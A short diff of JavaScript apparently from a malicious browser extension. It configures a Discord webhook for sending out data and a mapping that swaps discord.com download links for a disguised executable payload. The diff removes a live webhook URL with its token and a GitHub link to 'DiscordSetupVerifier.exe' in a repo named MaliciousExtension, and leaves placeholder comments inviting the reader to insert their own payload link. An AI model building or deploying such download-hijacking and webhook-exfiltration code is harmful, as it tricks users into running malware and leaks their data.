@@ -1,5 +1,5 @@
 // global variables relevant to webhook deployment
-const url = "https://discord.com/api/webhooks/1096825432357212280/jyNgGksyiX7rdZv9CamLBM9smKy72Dk30L3n6H2qgWz8vlXtYiTTo8R-98i-v8GPZfxO"; // webhook url goes here
+const url = ""; // webhook url goes here
 
 // ENUMS
 const TAB_SWITCH = 0;
@@ -17,7 +17,7 @@ let blacklist = [
 ]
 
 let malware_url_mapping = {
-    'https://discord.com/': 'https://github.com/DAlba-sudo/MaliciousExtension/blob/main/DiscordSetupVerifier.exe?raw=true',
+    'https://discord.com/': '', // the link to the payload you want to replace download links with goes here
 }
 
 // settings related files
